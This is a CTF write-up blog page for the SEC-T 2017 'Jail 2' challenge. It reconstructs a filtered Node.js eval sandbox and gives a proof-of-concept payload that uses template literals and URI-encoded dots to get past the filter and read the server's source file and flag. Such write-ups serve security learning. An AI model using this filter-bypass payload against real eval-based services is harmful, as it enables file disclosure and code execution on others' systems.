@@ -1,0 +1,387 @@
+<!doctype html>
+<html lang="en">
+
+  <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="https://unpkg.com/purecss@2.0.3/build/pure-min.css" integrity="sha384-cg6SkqEOCV1NbJoCu11+bm0NvBRc8IYLRGXkmNrqUBfTjmMYwNKPWBTIKyw9mHNJ" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://unpkg.com/purecss@2.0.3/build/grids-responsive-min.css">
+  <link rel="stylesheet" href="/assets/styles.css"><!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>[SEC-T CTF]Jail 2 writeup | elephacking</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="[SEC-T CTF]Jail 2 writeup" />
+<meta name="author" content="Elephacking" />
+<meta property="og:locale" content="en" />
+<meta name="description" content="Warning: As I found the solution after the server was down. So I could not evaluate if this answer was correct. Please let me know if you found there is any mistake." />
+<meta property="og:description" content="Warning: As I found the solution after the server was down. So I could not evaluate if this answer was correct. Please let me know if you found there is any mistake." />
+<link rel="canonical" href="https://blog.hitlab.space/2017/09/17/SEC-T-CTF-Jail-2-writeup/" />
+<meta property="og:url" content="https://blog.hitlab.space/2017/09/17/SEC-T-CTF-Jail-2-writeup/" />
+<meta property="og:site_name" content="elephacking" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2017-09-17T00:00:00+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="[SEC-T CTF]Jail 2 writeup" />
+<meta name="twitter:site" content="@<hidden>" />
+<meta name="twitter:creator" content="@Elephacking" />
+<meta name="google-site-verification" content="xxxxx" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","url":"https://blog.hitlab.space/2017/09/17/SEC-T-CTF-Jail-2-writeup/","headline":"[SEC-T CTF]Jail 2 writeup","dateModified":"2017-09-17T00:00:00+08:00","datePublished":"2017-09-17T00:00:00+08:00","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"https://blog.hitlab.space/assets/icons/favicon.ico"},"name":"Elephacking"},"author":{"@type":"Person","name":"Elephacking"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.hitlab.space/2017/09/17/SEC-T-CTF-Jail-2-writeup/"},"description":"Warning: As I found the solution after the server was down. So I could not evaluate if this answer was correct. Please let me know if you found there is any mistake.","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link type="application/atom+xml" rel="alternate" href="https://blog.hitlab.space/feed.xml" title="elephacking" />
+</head>
+
+
+  <body>
+
+    <div class="container pure-g"><div class="sidebar-left pure-u-1 pure-u-md-1-4" style="background-color: rgb(40, 73, 77); color: rgb(255, 255, 255); background-image: url(/assets/img/sidebar-bg.jpg);"><header class="masthead">
+  <div class="avatar"><img src="/assets/icons/logo.png" class="avatar-image" alt="Elephacking">
+    </div>
+  <div class="masthead-title">
+    <a href="/" title="Home">elephacking</a>
+  </div>
+  <div class="masthead-tagline">
+    <small>A Slave, a Security Fans, a Pentester, a Red Teamer - 隨便寫寫Cyber Security，在大學學到的東西和工作學到的東西 - I am moving my posts from the old blog to jekyll... -</small>
+  </div><nav class="navigation">
+    <ul class="navigation-list"><li class="navigation-item">
+        <a onclick="sessionStorage.setItem('forceCheckScroll', 'true')" href="/">Blog</a>
+      </li><li class="navigation-item">
+        <a onclick="sessionStorage.setItem('forceCheckScroll', 'true')" href="/about/">About</a>
+      </li></ul>
+  </nav><div class="social pure-menu pure-menu-horizontal">
+      <ul class="social-icons pure-menu-list">
+      <li class="pure-menu-item">
+          <a class="social-icon pure-menu-link" href="mailto://elephacking@gmail.com">
+            <i class="fas fa-envelope" title="Email"></i>
+          </a>
+        </li><li class="pure-menu-item">
+          <a class="social-icon pure-menu-link" href="https://github.com/elephacking">
+            <i class="fab fa-github" title="GitHub"></i>
+          </a>
+        </li>
+      </ul>
+    </div>
+</header>
+</div>
+
+      <div class="content pure-u-1 pure-u-md-1-2"><main>
+  <article class="post">
+  <h1 class="post-title">[SEC-T CTF]Jail 2 writeup</h1>
+  <div class="post-meta"><time datetime="2017-09-17T00:00:00+08:00" itemprop="datePublished">17 Sep 2017</time></div>
+
+  <p><strong>Warning</strong>: As I found the solution after the server was down. So I could not evaluate if this answer was correct. Please let me know if you found there is any mistake.</p>
+
+<p>Questions:</p>
+
+<h1 id="jail-2--pwn-350--0">Jail 2 – Pwn (350 + 0)</h1>
+<p>After your last escape, they put you in solitary confinement. We ain’t got time for this, we got a planet to hack! Time to escape again!</p>
+
+<p>Solves: 18</p>
+
+<p>Service: <a href="jail2.alieni.se:55542" title="jail2.alieni.se:55542">jail2.alieni.se:55542</a></p>
+
+<p>Author: avlidienbrunn</p>
+
+<p>This time the filter was upgraded.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Phone #&gt; this
+Calling function call(number) {
+        var line = "";
+
+        var call,Array,ArrayBuffer,Boolean,Buffer,DTRACE_HTTP_CLIENT_REQUEST,DTRACE_HTTP_CLIENT_RESPONSE,DTRACE_HTTP_SERVER_REQUEST,DTRACE_HTTP_SERVER_RESPONSE,DTRACE_NET_SERVER_CONNECTION,DTRACE_NET_STREAM_END,DataView,Date,Error,EvalError,Float32Array,Float64Array,Function,Int16Array,Int32Array,Int8Array,Map,Number,Object,Promise,Proxy,RangeError,ReferenceError,Set,String,Symbol,SyntaxError,TypeError,URIError,Uint16Array,Uint32Array,Uint8Array,Uint8ClampedArray,WeakMap,WeakSet,__defineGetter__,__defineSetter__,__lookupGetter__,__lookupSetter__,assert,call,clearImmediate,clearInterval,clearTimeout,constructor,decodeURI,decodeURIComponent,encodeURI,encodeURIComponent,escape,events,flag,global,hasOwnProperty,isFinite,isNaN,isPrototypeOf,parseFloat,parseInt,process,propertyIsEnumerable,require,rl,setImmediate,setInterval,setTimeout,stream,template,toLocaleString,toString,unescape,valueOf;
+
+        if(new RegExp(/[\[\]\.\\\+\/;,=]/).test(number)){
+            console.log("Dangerous characters detected");
+            throw 123;
+            return;
+        }
+
+        if(new RegExp(/with/i).test(number)){
+            console.log("Dangerous characters detected");
+            throw 123;
+            return;
+        }
+
+        arguments = undefined;
+
+        console.log("Calling "+eval(number)+"... Nobody picks up!");
+        throw 123;
+    }... Nobody picks up!
+</code></pre></div></div>
+<p>Ok, the ‘with’ was filtered, ‘+’, ‘;’ ‘=’ were also filtered?</p>
+
+<p>(╯°Д°)╯ ┻━┻</p>
+
+<p>The following trick I found could bypass the filter of ‘;’</p>
+
+<p>There was feature called <a href="https://www.ecma-international.org/ecma-262/5.1/#sec-7.9" title="Automatic Semicolon Insertion">Automatic Semicolon Insertion</a>, use {} to wrap every statement could call multiple statement without ‘;’</p>
+
+<p>e.g. <strong>{statementA}{statementB}</strong> is equivalent to <strong>statementA;statementB;</strong></p>
+
+<p>But turned out this was absolutely <strong>no use</strong> for the pwn…</p>
+
+<p>I could not figure out the answer before the game was ended. This question puzzled me until today.</p>
+
+<p>The trick:<a href="https://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Reference/Template_literals" title="模板源文本 (template literals)">模板源文本 (template literals)</a></p>
+
+<p>Basically, this trick was to concatenate variables, functions, and strings without using ‘+’</p>
+
+<p>e.g. <code class="language-plaintext highlighter-rouge">&amp;#x60;StringA${VariableB}${FunctionC()}&amp;#x60;</code> is equivalent to <code class="language-plaintext highlighter-rouge">'String A' + VariableB + FunctionC()</code></p>
+
+<p>I didn’t (couldn’t) clone the full program of jail2 so I rewrite the Jail 1’s program to the Jail 2 version.  Basically I just updated the filter.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">flag</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">SECT{iamjail2flag}</span><span class="dl">"</span>
+<span class="kd">var</span> <span class="nx">readline</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">readline</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">rl</span> <span class="o">=</span> <span class="nx">readline</span><span class="p">.</span><span class="nx">createInterface</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">stdin</span><span class="p">,</span> <span class="nx">process</span><span class="p">.</span><span class="nx">stdout</span><span class="p">);</span>
+
+<span class="kd">var</span> <span class="nx">Jail</span> <span class="o">=</span> <span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">rv</span> <span class="o">=</span> <span class="p">{};</span>
+
+    <span class="kd">function</span> <span class="nx">call</span><span class="p">(</span><span class="nx">number</span><span class="p">)</span> <span class="p">{</span>
+            <span class="kd">var</span> <span class="nx">line</span> <span class="o">=</span> <span class="dl">""</span><span class="p">;</span>
+
+            <span class="kd">var</span> <span class="nx">call</span><span class="p">,</span><span class="nb">Array</span><span class="p">,</span><span class="nb">ArrayBuffer</span><span class="p">,</span><span class="nb">Boolean</span><span class="p">,</span><span class="nx">Buffer</span><span class="p">,</span><span class="nx">DTRACE_HTTP_CLIENT_REQUEST</span><span class="p">,</span><span class="nx">DTRACE_HTTP_CLIENT_RESPONSE</span><span class="p">,</span><span class="nx">DTRACE_HTTP_SERVER_REQUEST</span><span class="p">,</span><span class="nx">DTRACE_HTTP_SERVER_RESPONSE</span><span class="p">,</span><span class="nx">DTRACE_NET_SERVER_CONNECTION</span><span class="p">,</span><span class="nx">DTRACE_NET_STREAM_END</span><span class="p">,</span><span class="nb">DataView</span><span class="p">,</span><span class="nb">Date</span><span class="p">,</span><span class="nb">Error</span><span class="p">,</span><span class="nx">EvalError</span><span class="p">,</span><span class="nb">Float32Array</span><span class="p">,</span><span class="nb">Float64Array</span><span class="p">,</span><span class="nb">Function</span><span class="p">,</span><span class="nb">Int16Array</span><span class="p">,</span><span class="nb">Int32Array</span><span class="p">,</span><span class="nb">Int8Array</span><span class="p">,</span><span class="nb">Map</span><span class="p">,</span><span class="nb">Number</span><span class="p">,</span><span class="nb">Object</span><span class="p">,</span><span class="nb">Promise</span><span class="p">,</span><span class="nb">Proxy</span><span class="p">,</span><span class="nx">RangeError</span><span class="p">,</span><span class="nx">ReferenceError</span><span class="p">,</span><span class="nb">Set</span><span class="p">,</span><span class="nb">String</span><span class="p">,</span><span class="nb">Symbol</span><span class="p">,</span><span class="nx">SyntaxError</span><span class="p">,</span><span class="nx">TypeError</span><span class="p">,</span><span class="nx">URIError</span><span class="p">,</span><span class="nb">Uint16Array</span><span class="p">,</span><span class="nb">Uint32Array</span><span class="p">,</span><span class="nb">Uint8Array</span><span class="p">,</span><span class="nb">Uint8ClampedArray</span><span class="p">,</span><span class="nb">WeakMap</span><span class="p">,</span><span class="nb">WeakSet</span><span class="p">,</span><span class="nx">__defineGetter__</span><span class="p">,</span><span class="nx">__defineSetter__</span><span class="p">,</span><span class="nx">__lookupGetter__</span><span class="p">,</span><span class="nx">__lookupSetter__</span><span class="p">,</span><span class="nx">assert</span><span class="p">,</span><span class="nx">call</span><span class="p">,</span><span class="nx">clearImmediate</span><span class="p">,</span><span class="nx">clearInterval</span><span class="p">,</span><span class="nx">clearTimeout</span><span class="p">,</span><span class="kd">constructor</span><span class="p">,</span><span class="nb">decodeURI</span><span class="p">,</span><span class="nb">decodeURIComponent</span><span class="p">,</span><span class="nb">encodeURI</span><span class="p">,</span><span class="nb">encodeURIComponent</span><span class="p">,</span><span class="nx">escape</span><span class="p">,</span><span class="nx">events</span><span class="p">,</span><span class="nx">flag</span><span class="p">,</span><span class="nb">global</span><span class="p">,</span><span class="nx">hasOwnProperty</span><span class="p">,</span><span class="nb">isFinite</span><span class="p">,</span><span class="nb">isNaN</span><span class="p">,</span><span class="nx">isPrototypeOf</span><span class="p">,</span><span class="nb">parseFloat</span><span class="p">,</span><span class="nb">parseInt</span><span class="p">,</span><span class="nx">process</span><span class="p">,</span><span class="nx">propertyIsEnumerable</span><span class="p">,</span><span class="nx">require</span><span class="p">,</span><span class="nx">rl</span><span class="p">,</span><span class="nx">setImmediate</span><span class="p">,</span><span class="nx">setInterval</span><span class="p">,</span><span class="nx">setTimeout</span><span class="p">,</span><span class="nx">stream</span><span class="p">,</span><span class="nx">template</span><span class="p">,</span><span class="nx">toLocaleString</span><span class="p">,</span><span class="nx">toString</span><span class="p">,</span><span class="nx">unescape</span><span class="p">,</span><span class="nx">valueOf</span><span class="p">;</span>
+
+            <span class="k">if</span><span class="p">(</span><span class="k">new</span> <span class="nb">RegExp</span><span class="p">(</span><span class="sr">/</span><span class="se">[\[\]\.\\\+\/</span><span class="sr">;,=</span><span class="se">]</span><span class="sr">/</span><span class="p">).</span><span class="nx">test</span><span class="p">(</span><span class="nx">number</span><span class="p">)){</span>
+                <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Dangerous characters detected</span><span class="dl">"</span><span class="p">);</span>
+                <span class="k">throw</span> <span class="mi">123</span><span class="p">;</span>
+                <span class="k">return</span><span class="p">;</span>
+            <span class="p">}</span>
+
+            <span class="k">if</span><span class="p">(</span><span class="k">new</span> <span class="nb">RegExp</span><span class="p">(</span><span class="sr">/with/i</span><span class="p">).</span><span class="nx">test</span><span class="p">(</span><span class="nx">number</span><span class="p">)){</span>
+                <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Dangerous characters detected</span><span class="dl">"</span><span class="p">);</span>
+                <span class="k">throw</span> <span class="mi">123</span><span class="p">;</span>
+                <span class="k">return</span><span class="p">;</span>
+            <span class="p">}</span>
+
+            <span class="nx">arguments</span> <span class="o">=</span> <span class="kc">undefined</span><span class="p">;</span>
+
+            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Calling </span><span class="dl">"</span><span class="o">+</span><span class="nb">eval</span><span class="p">(</span><span class="nx">number</span><span class="p">)</span><span class="o">+</span><span class="dl">"</span><span class="s2">... Nobody picks up!</span><span class="dl">"</span><span class="p">);</span>
+            <span class="k">throw</span> <span class="mi">123</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="nx">rv</span><span class="p">.</span><span class="nx">call</span> <span class="o">=</span> <span class="nx">call</span><span class="p">;</span>
+    <span class="nx">rv</span><span class="p">.</span><span class="nx">toString</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){</span><span class="k">return</span> <span class="nx">rv</span><span class="p">.</span><span class="nx">call</span><span class="p">.</span><span class="nx">toString</span><span class="p">()};</span>
+
+    <span class="k">return</span> <span class="nx">rv</span><span class="p">;</span>
+<span class="p">})();</span>
+
+<span class="nx">template</span> <span class="o">=</span> <span class="s2">`_____________________________
+     ||   ||     ||   ||
+     ||   ||, , ,||   ||
+     ||  (||/|/(\/||/  ||
+     ||  ||| _'_´|||  ||
+     ||   || o o ||   ||
+     ||  (||  - ´||)  ||
+     ||   ||  =  ||   ||
+     ||   ||\\___/||   ||
+     ||___||) , (||___||
+    /||---||-\\_/-||---||\\
+   / ||--_||_____||_--|| \\
+  (_(||)-|S555-4202|-(||)_)
+|"""""""""""""""""""""""""""|
+| "You get one call, UNO."  |
+ """""""""""""""""""""""""""
+ Phone #&gt; `</span><span class="p">;</span>
+
+<span class="kd">function</span> <span class="nx">youcanneverguessthisfunction</span><span class="p">(){</span>
+  <span class="nx">rl</span><span class="p">.</span><span class="nx">question</span><span class="p">(</span><span class="dl">'</span><span class="s1">previous challenge&gt;</span><span class="dl">'</span><span class="p">,</span><span class="kd">function</span><span class="p">(</span><span class="nx">answer</span><span class="p">){</span>
+    <span class="c1">//Jail1 flag</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">answer</span> <span class="o">!==</span> <span class="dl">'</span><span class="s1">SECT{1ts_1n_th4T_pl4Ce_Wh3re_1_Pu7_tH4t_Th1ng_th4T_t1m3,}</span><span class="dl">'</span><span class="p">)</span>  <span class="p">{</span>
+      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Wrong!</span><span class="dl">'</span><span class="p">);</span>
+      <span class="nx">process</span><span class="p">.</span><span class="nx">exit</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="nx">rl</span><span class="p">.</span><span class="nx">question</span><span class="p">(</span><span class="nx">template</span><span class="p">,</span><span class="kd">function</span><span class="p">(</span><span class="nx">answer</span><span class="p">){</span>
+      <span class="k">try</span><span class="p">{</span>
+        <span class="nx">Jail</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="nx">answer</span><span class="p">);</span>
+      <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">process</span><span class="p">.</span><span class="nx">exit</span><span class="p">();</span>
+      <span class="p">}</span>
+    <span class="p">});</span>
+  <span class="p">});</span>
+<span class="p">}</span>
+
+<span class="nx">youcanneverguessthisfunction</span><span class="p">();</span>
+</code></pre></div></div>
+<p>This is <strong>not</strong> the original program of Jail2. But I guess it is quite similar to the original one.</p>
+
+<p>POC:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>previous challenge&gt;SECT{1ts_1n_th4T_pl4Ce_Wh3re_1_Pu7_tH4t_Th1ng_th4T_t1m3,}
+_____________________________
+     ||   ||     ||   ||
+     ||   ||, , ,||   ||
+     ||  (||/|/(/||/  ||
+     ||  ||| _'_´|||  ||
+     ||   || o o ||   ||
+     ||  (||  - ´||)  ||
+     ||   ||  =  ||   ||
+     ||   ||\___/||   ||
+     ||___||) , (||___||
+    /||---||-\_/-||---||\
+   / ||--_||_____||_--|| \
+  (_(||)-|S555-4202|-(||)_)
+|"""""""""""""""""""""""""""|
+| "You get one call, UNO."  |
+ """""""""""""""""""""""""""
+ Phone #&gt; eval(`w${line}ith (root) { eval(decodeURIComponent("module%2Erequire('fs')%2EreadFileSync(__filename)")) }`)
+Calling var flag = "SECT{iamjail2flag}"
+var readline = require('readline');
+var rl = readline.createInterface(process.stdin, process.stdout);
+
+var Jail = (function() {
+    var rv = {};
+
+    function call(number) {
+            var line = "";
+
+            var call,Array,ArrayBuffer,Boolean,Buffer,DTRACE_HTTP_CLIENT_REQUEST,DTRACE_HTTP_CLIENT_RESPONSE,DTRACE_HTTP_SERVER_REQUEST,DTRACE_HTTP_SERVER_RESPONSE,DTRACE_NET_SERVER_CONNECTION,DTRACE_NET_STREAM_END,DataView,Date,Error,EvalError,Float32Array,Float64Array,Function,Int16Array,Int32Array,Int8Array,Map,Number,Object,Promise,Proxy,RangeError,ReferenceError,Set,String,Symbol,SyntaxError,TypeError,URIError,Uint16Array,Uint32Array,Uint8Array,Uint8ClampedArray,WeakMap,WeakSet,__defineGetter__,__defineSetter__,__lookupGetter__,__lookupSetter__,assert,call,clearImmediate,clearInterval,clearTimeout,constructor,decodeURI,decodeURIComponent,encodeURI,encodeURIComponent,escape,events,flag,global,hasOwnProperty,isFinite,isNaN,isPrototypeOf,parseFloat,parseInt,process,propertyIsEnumerable,require,rl,setImmediate,setInterval,setTimeout,stream,template,toLocaleString,toString,unescape,valueOf;
+
+            if(new RegExp(/[\[\]\.\\\+\/;,=]/).test(number)){
+                console.log("Dangerous characters detected");
+                throw 123;
+                return;
+            }
+
+            if(new RegExp(/with/i).test(number)){
+                console.log("Dangerous characters detected");
+                throw 123;
+                return;
+            }
+
+            arguments = undefined;
+
+            console.log("Calling "+eval(number)+"... Nobody picks up!");
+            throw 123;
+        }
+    rv.call = call;
+    rv.toString = function(){return rv.call.toString()};
+
+    return rv;
+})();
+
+template = `_____________________________
+     ||   ||     ||   ||
+     ||   ||, , ,||   ||
+     ||  (||/|/(\/||/  ||
+     ||  ||| _'_´|||  ||
+     ||   || o o ||   ||
+     ||  (||  - ´||)  ||
+     ||   ||  =  ||   ||
+     ||   ||\\___/||   ||
+     ||___||) , (||___||
+    /||---||-\\_/-||---||\\
+   / ||--_||_____||_--|| \\
+  (_(||)-|S555-4202|-(||)_)
+|"""""""""""""""""""""""""""|
+| "You get one call, UNO."  |
+ """""""""""""""""""""""""""
+ Phone #&gt; `;
+
+function youcanneverguessthisfunction(){
+  rl.question('previous challenge&gt;',function(answer){
+    //Jail1 flag
+    if (answer !== 'SECT{1ts_1n_th4T_pl4Ce_Wh3re_1_Pu7_tH4t_Th1ng_th4T_t1m3,}')  {
+      console.log('Wrong!');
+      process.exit();
+    }
+    rl.question(template,function(answer){
+      try{
+        Jail.call(answer);
+      } catch (e) {
+        process.exit();
+      }
+    });
+  });
+}
+
+youcanneverguessthisfunction();
+... Nobody picks up!
+</code></pre></div></div>
+
+<p>Cheers(?)</p>
+
+
+  
+</article>
+
+
+<aside class="related">
+  <h3>Related posts</h3>
+  <ul class="related-posts">
+    
+      <li>
+        <a href="/2017/09/17/SEC-T-CTF-Joeys-screenshot-writeup/">
+          [SEC-T CTF]Joeys screenshot writeup
+          <small><time datetime="2017-09-17T00:00:00+08:00">17 Sep 2017</time></small>
+        </a>
+      </li>
+    
+      <li>
+        <a href="/2017/09/17/SEC-T-CTF-Jail-writeup/">
+          [SEC-T CTF]Jail writeup
+          <small><time datetime="2017-09-17T00:00:00+08:00">17 Sep 2017</time></small>
+        </a>
+      </li>
+    
+      <li>
+        <a href="/2017/09/17/SEC-T-CTF-Black-&-White-Writeup/">
+          [SEC-T CTF]Black & White Writeup
+          <small><time datetime="2017-09-17T00:00:00+08:00">17 Sep 2017</time></small>
+        </a>
+      </li>
+    
+  </ul>
+</aside>
+
+
+</main>
+
+<footer class="footer"><small>
+    &copy; 2017&nbsp;-&nbsp;2021 <a href="https://github.com/elephacking">Elephacking</a>. All rights reserved.
+    Powered by <a href="https://jekyllrb.com/">Jekyll</a> & <a href="https://github.com/vszhub/not-pure-poole">Not Pure Poole</a>.
+  </small>
+</footer>
+</div>
+      <div class="sidebar-right pure-u-1 pure-u-md-1-4">
+</div>
+    </div>
+
+    <script async src="https://use.fontawesome.com/releases/v5.0.12/js/all.js"></script><script>
+  function strip(str, remove) {
+    while (str.length > 0 && remove.indexOf(str.charAt(0)) != -1) {
+      str = str.substr(1);
+    }
+    while (str.length > 0 && remove.indexOf(str.charAt(str.length - 1)) != -1) {
+      str = str.substr(0, str.length - 1);
+    }
+    return str;
+  }
+
+  function scroll() {
+    console.log('scroll');
+    window.scrollTo({
+      left: 0, 
+      top: window.innerHeight,
+      behavior: 'smooth'
+    });
+    sessionStorage.removeItem('forceCheckScroll');
+  }
+
+  const forceCheckScroll = sessionStorage.getItem('forceCheckScroll') === 'true';
+  const checkScroll = strip(window.location.pathname, '/') !== strip('', '/');
+
+  if (forceCheckScroll || checkScroll) {
+    const maxWidth = "(max-width: 48rem)";
+    const result = window.matchMedia(maxWidth);
+    if (result.matches) {
+      scroll();
+    } else {
+      result.addListener((match) => {
+        if (match.media == maxWidth) {
+          if (match.matches) {
+            scroll();
+          }
+        }
+      });
+    }
+  }
+</script>
+</body>
+</html>
